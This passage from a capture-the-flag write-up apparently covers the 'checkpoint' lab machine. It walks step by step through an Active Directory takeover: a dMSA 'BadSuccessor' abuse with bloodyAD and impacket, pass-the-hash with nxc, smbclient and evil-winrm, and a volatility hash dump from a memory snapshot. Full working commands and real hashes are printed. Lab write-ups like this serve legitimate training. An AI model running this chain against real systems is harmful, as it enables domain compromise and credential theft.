65cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: svc_deploy
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: 29c7edbe-204b-43b4-99d6-f9816f80039d
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1104
primaryGroupID: 513
pwdLastSet: 2026-05-09 09:01:19.573610+00:00
sAMAccountName: svc_deploy
sAMAccountType: 805306368
uSNChanged: 16435
uSNCreated: 12783
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: svc_deploy@checkpoint.htb
whenChanged: 2026-05-09 10:05:23+00:00
whenCreated: 2026-05-09 09:01:19+00:00

```

This user is part of the Remote Management group, meaning we can use it to get WinRM access, but more importantly it is also a member of the BackupAccess group. Earlier in the shares we saw there was a VMBackup share we couldn't access with either Alex, Mark, or Ryan. Seems we found our in. 

First let's get a ticket for svc_deploy. We want to start adding DONT_REQ_PREAUTH

```
 sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -k -d checkpoint.htb \
  add uac svc_deploy -f DONT_REQ_PREAUTH
2026-10-03 17:20:20.151366 (-0400) +25199.564747 +/- 0.016591 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.564747
[+] ['DONT_REQ_PREAUTH'] property flags added to svc_deploy's userAccountControl
```

What this does is it disables Kerberos preauthentication enabling us to ASREProast the account:

```
$ sudo ntpdate -u checkpoint.htb; getST.py -k -no-pass -dc-ip 10.129.65.17 checkpoint.htb/ryan.brooks -impersonate svc_deploy -spn ldap/checkpoint.htb 
2026-10-03 17:22:07.972650 (-0400) +25199.564627 +/- 0.016431 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.564627
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating svc_deploy
/home/kali/Hacks/checkpoint/.venv/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/Hacks/checkpoint/.venv/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Probably user ryan.brooks does not have constrained delegation permisions or impersonated user does not exist

```
Damn. Our user doesn't have permission to do this. However, because he has write access to svc_deploy and the group "DMSAHolder" it's possible we can attempt a bad successor attack. In essence, we create an object that has all of the same privileges as svc_deploy. BloodyAD is great for this.

```
┌──(.venv)─(kali㉿kali)-[~/Hacks/checkpoint]
└─$ sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -k -d checkpoint.htb add badSuccessor fidel.hax -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
" --ou "OU=DMSAHolder,DC=checkpoint,DC=htb" --prepatch
2026-10-03 17:26:00.933137 (-0400) +25199.565178 +/- 0.103386 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.565178
[+] Creating DMSA fidel.hax$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

[-] Failed to retrieve dMSA TGT
[-] DC seems patched or didn't have time to take into account changes, remove the --prepatch flag, ensure you have write permissions on targets and try again!
[-] Try using Rubeus, or something like:
[-] badS4U2self 'kerberos+ccache://checkpoint.htb\None:%2Fhome%2Fkali%2FHacks%2Fcheckpoint%2Fryan.ccache@10.129.65.17/' 'krbtgt/checkpoint.htb@checkpoint.htb' 'fidel.hax$@checkpoint.htb' --dmsa
Traceback (most recent call last):
  File "/home/kali/Hacks/checkpoint/.venv/bin/bloodyad", line 7, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.14/asyncio/runners.py", line 205, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.14/asyncio/runners.py", line 128, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.14/asyncio/base_events.py", line 720, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/bloodyAD/main.py", line 272, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/bloodyAD/cli_modules/add.py", line 195, in badSuccessor
    raise e
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/bloodyAD/cli_modules/add.py", line 186, in badSuccessor
    tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
                              ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/kerbad/client.py", line 845, in with_clock_skew
    return func(*args, **kwargs)
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/kerbad/client.py", line 676, in S4U2self
    reply = self.ksoc.sendrecv(req.dump())
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/kerbad/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
kerbad.protocol.errors.KerberosError:  Error Name: KRB_ERR_GENERIC Detail: "Generic error; the description is in the e-data field" 

```
We get an error message, but it doesn't tell us much. Let's run get writable again and see if we were able to create anything.

```
─$ sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -d checkpoint.htb -k get writable                                                      
2026-10-03 17:26:19.333892 (-0400) +25199.567443 +/- 0.016991 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.567443

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD; WRITE
DACL: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

```
Check it out. We created the fidel.hax user in the DMSAHolder account. Let's look at this object.

```
sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -d checkpoint.htb -k get object "CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb"
2026-10-03 17:28:50.241055 (-0400) +25199.566327 +/- 0.016593 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.566327

distinguishedName: CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: fidel.hax
codePage: 0
countryCode: 0
dNSHostName: fidel.hax.checkpoint.htb
dSCorePropagationData: 1601-01-01 00:00:00+00:00
instanceType: 4
isCriticalSystemObject: False
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
lastLogonTimestamp: 2026-10-03 21:26:05.089212+00:00
localPolicyFlags: 0
logonCount: 0
msDS-DelegatedMSAState: 2
msDS-GroupMSAMembership: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-1103)
msDS-ManagedAccountPrecededByLink: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAbAEAAA4AAAAZAAAAX0AOVTEe6j/i/jayGf1J5gAAAAAeAAAAHgAAAGMAaABlAGMAawBwAG8AaQBuAHQALgBoAHQAYgAAAGMAaABlAGMAawBwAG8AaQBuAHQALgBoAHQAYgAAAA==
msDS-ManagedPasswordInterval: 30
msDS-SupportedEncryptionTypes: 28
nTSecurityDescriptor: O:S-1-5-21-3129162710-3498938529-1807524340-1103G:S-1-5-21-3129162710-3498938529-1807524340-513D:AI(OD;;CR;00299570-246d-11d0-a768-00aa006e0529;;S-1-1-0)(OD;;RP;e362ed86-b728-0842-b27d-2dea7a9df218;;S-1-1-0)(OA;;WP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3129162710-3498938529-1807524340-1103)(OA;;WP;bf967950-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3129162710-3498938529-1807524340-1103)(OA;;WP;bf967953-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3129162710-3498938529-1807524340-1103)(OA;;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3129162710-3498938529-1807524340-1103)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;S-1-5-21-3129162710-3498938529-1807524340-1103)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;S-1-5-21-3129162710-3498938529-1807524340-1103)(OA;;WP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3129162710-3498938529-1807524340-1103)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;S-1-5-10)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;S-1-5-10)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0x301d4;;;S-1-5-21-3129162710-3498938529-1807524340-1103)(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;0xf01ff;;;S-1-5-18)(A;CIID;CC;;;S-1-5-21-3129162710-3498938529-1807524340-1103)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: fidel.hax
objectCategory: CN=ms-DS-Delegated-Managed-Service-Account,CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
objectClass: top; person; organizationalPerson; user; computer; msDS-DelegatedManagedServiceAccount
objectGUID: 8d20f837-a924-4fcf-a815-20def992de80
objectSid: S-1-5-21-3129162710-3498938529-1807524340-7101
primaryGroupID: 515
pwdLastSet: 2026-10-03 21:26:04.893010+00:00
sAMAccountName: fidel.hax$
sAMAccountType: 805306369
uSNChanged: 151685
uSNCreated: 151681
userAccountControl: WORKSTATION_TRUST_ACCOUNT
whenChanged: 2026-10-03 21:26:05+00:00
whenCreated: 2026-10-03 21:26:04+00:00

```

Look at this attribute: msDS-ManagedAccountPrecededByLink: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

It means our object targetting worked, and the new object is linked to the svc_deploy account. Now we need to link it to the fidel.hax account. 

```
sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -i 10.129.65.17 -k -d checkpoint.htb \
  set object "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" msDS-SupersededManagedAccountLink -v "CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb"
2026-10-03 17:31:11.890731 (-0400) +25199.566410 +/- 0.016827 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.566410
[+] CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb's msDS-SupersededManagedAccountLink has been updated

set object "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  msDS-SupersededServiceAccountState -v 2
2026-10-03 17:43:48.316489 (-0400) +25199.568348 +/- 0.016197 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.568348
[+] CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb's msDS-SupersededServiceAccountState has been updated


```

We successfully edit the svc_deploy account and make the fidel.hax object the superseded managed account for svc_deploy.

Howver, when we try to edit the delegated dmsa state on fidel.hax in order to ensure that KDC treats fidel.hax as the legitimate successor to svc_deploy we get an error.

```
(.venv)─(kali㉿kali)-[~/Hacks/checkpoint]
└─$ sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -i 10.129.65.17 -k -d checkpoint.htb \
  set object "CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb" msDS-DelegatedMSAState -v 2
2026-10-03 17:32:30.447421 (-0400) +25199.567096 +/- 0.016554 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.567096
Traceback (most recent call last):
  File "/home/kali/Hacks/checkpoint/.venv/bin/bloodyad", line 7, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.14/asyncio/runners.py", line 205, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.14/asyncio/runners.py", line 128, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.14/asyncio/base_events.py", line 720, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/bloodyAD/main.py", line 272, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/bloodyAD/cli_modules/set.py", line 104, in object
    await ldap.bloodymodify(
        target, {attribute: [(Change.REPLACE.value, v)]}, encode=(not raw)
    )
  File "/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/bloodyAD/network/ldap.py", line 341, in bloodymodify
    raise err
badldap.commons.exceptions.LDAPModifyException: insufficientAccessRights for CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb (Attr) — Reason:(ERROR_DS_INSUFF_ACCESS_RIGHTS) Insufficient access rights to perform the operation.

```

The problem is that we have genericWrite rights on fidel.hax, but not genericAll. Let's fix that and try again.

```
sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -k  -d checkpoint.htb add genericAll "CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb" ryan.brooks                                                                                                                           
2026-10-03 17:33:50.124654 (-0400) +25199.569765 +/- 0.018868 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.569765
[+] ryan.brooks has now GenericAll on CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb
                                                                                                                                                            
┌──(.venv)─(kali㉿kali)-[~/Hacks/checkpoint]
└─$ sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -i 10.129.65.17 -k -d checkpoint.htb \
  set object "CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb" msDS-DelegatedMSAState -v 2
2026-10-03 17:34:00.319831 (-0400) +25199.567827 +/- 0.016933 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.567827
[+] CN=fidel.hax,OU=DMSAHolder,DC=checkpoint,DC=htb's msDS-DelegatedMSAState has been updated

```

Fantastic. Now we have everything we need to get access to svc_deploy. And since we have everything, let's start by grabbing the ntlm hash for svc_deploy. 

```
sudo ntpdate -u checkpoint.htb; impacket-getST -k -no-pass -impersonate 'fidel.hax$' -self -dmsa -dc-ip 10.129.65.17 checkpoint.htb/ryan.brooks
2026-10-03 17:44:13.462900 (-0400) +25199.569897 +/- 0.016434 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.569897
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating fidel.hax$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:f0331ef44df08f23959c607266f9d1d1ede0f47b9d0f056af597356b50864d3d
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:efc7c9faebb5cd881f71a3c4ec289392
[*] EncryptionTypes.rc4_hmac:6bc50a5203447fcec379c7fe6aa460b5
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:e16081eb077aca74bdbf8af12af43ac9
[*] Saving ticket in fidel.hax$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache

```

We have the hash for the svc_deploy account. It is located in the previous keys.

```
e16081eb077aca74bdbf8af12af43ac9
```

Let's see if it works

```
$ nxc ldap checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
LDAP        10.129.65.17    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.65.17    389    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 

```

And it does. Let's see if it works for WinRM.

```
$ nxc winrm checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
WINRM       10.129.65.17    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.65.17    5985   DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 (Pwn3d!)
```

Indeed. But before we pop a shell let's see what's in that VMBackup share.

```
$ smbclient \\\\checkpoint.htb\\VMBackups -u svc_deploy --pw-nt-hash e16081eb077aca74bdbf8af12af43ac9 

Invalid option -u: unknown option

Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
        [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
        [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE]
        [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL]
        [-n|--netbiosname=NETBIOSNAME] [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP] [--realm=REALM] [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]]
        [-N|--no-pass] [--password=STRING] [--pw-nt-hash] [-A|--authentication-file=FILE] [-P|--machine-pass] [--simple-bind-dn=DN]
        [--use-kerberos=desired|required|off] [--use-krb5-ccache=CCACHE] [--use-winbind-ccache] [--client-protection=sign|encrypt|off] [-k|--kerberos]
        [-V|--version] [OPTIONS] service <password>
                                                                                                                                                            
┌──(kali㉿kali)-[~/Hacks/checkpoint]
└─$ smbclient \\\\checkpoint.htb\\VMBackups -U svc_deploy --pw-nt-hash e16081eb077aca74bdbf8af12af43ac9 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May  9 13:15:22 2026
  ..                                  D        0  Sat May  9 10:42:27 2026
  NightlyBackup_2024-11-01            D        0  Sat May  9 12:54:19 2026

                10459391 blocks of size 4096. 2487618 blocks available
smb: \> cd NightlyBackup_2024-11-01\
smb: \NightlyBackup_2024-11-01\> ls
  .                                   D        0  Sat May  9 12:54:19 2026
  ..                                  D        0  Sat May  9 13:15:22 2026
  memory forensics                    D        0  Sat May  9 13:12:44 2026

                10459391 blocks of size 4096. 2487618 blocks available
smb: \NightlyBackup_2024-11-01\> cd "memory forensics"
smb: \NightlyBackup_2024-11-01\memory forensics\> ls
  .                                   D        0  Sat May  9 13:12:44 2026
  ..                                  D        0  Sat May  9 12:54:19 2026
  Windows Server 2019-000001.vmdk      A 106496000  Sat May  9 22:45:22 2026
  Windows Server 2019-Snapshot1.vmem      A 2147483648  Sat May  9 22:40:36 2026
  Windows Server 2019-Snapshot1.vmsn      A 138164859  Sat May  9 22:40:36 2026
  Windows Server 2019.nvram           A   270840  Sat May  9 22:39:00 2026
  Windows Server 2019.scoreboard      A     7642  Sat May  9 22:45:22 2026
  Windows Server 2019.vmdk            A 10199695360  Sat May  9 22:39:00 2026
  Windows Server 2019.vmsd            A      502  Sat May  9 22:39:00 2026
  Windows Server 2019.vmx             A     2749  Sat May  9 22:45:22 2026
  Windows Server 2019.vmxf            A      274  Sat May  9 22:22:44 2026

```

Jackpot. We can most likely get the Administrtor hash from here. Let's first download the Windows Server 2019-Snapshot1.vmem file so we can inspect it from our machine. This file is a snapshot of the VM's ram when the snapshot was taken.

```
get Windows Server 2019-Snapshot1.vmem
```

Using volatility3, we can extract the hashes from the vmmem file. 

```
─$ vol -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump.Hashdump
Volatility 3 Framework 2.28.2
/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/volatility3/framework/deprecation.py:28: FutureWarning: This API (volatility3.plugins.windows.registry.hashdump.Hashdump.run) will be removed in the first release after 2026-09-25. This plugin has been renamed, please call volatility3.plugins.windows.registry.hashdump.Hashdump rather than volatility3.plugins.windows.hashdump.Hashdump.
  warnings.warn(

User    rid     lmhash  nthash
/home/kali/Hacks/checkpoint/.venv/lib/python3.14/site-packages/volatility3/framework/deprecation.py:105: FutureWarning: This plugin (volatility3.plugins.windows.hashdump.Hashdump) has been renamed and will be removed in the first release after 2026-09-25. Please ensure all method calls to this plugin are replaced with calls to volatility3.plugins.windows.registry.hashdump.Hashdump
  warnings.warn(

Administrator   500     aad3b435b51404eeaad3b435b51404ee        f29e9c014295b9b32139b09a2790be3b
Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        28f8d934dee90b2ec824351cb0844479

```

Now all we gotta do is run evil-winRM to access the Administrator account and provide the second hash provided. 

```
└─$ sudo ntpdate -u checkpoint.htb; evil-winrm -u Administrator -i checkpoint.htb -H f29e9c014295b9b32139b09a2790be3b
[sudo] password for kali: 
2026-10-03 18:00:14.503972 (-0400) +25199.590884 +/- 0.055611 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.590884
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

And voila, we own the entire domain. We can find the root flag in max.palmer's desktop. 

This was an incredibly challenging machine for a medium but it forced me to learn a ton about how active directory handles user privileges and how to protect them from bad successor attacks. 
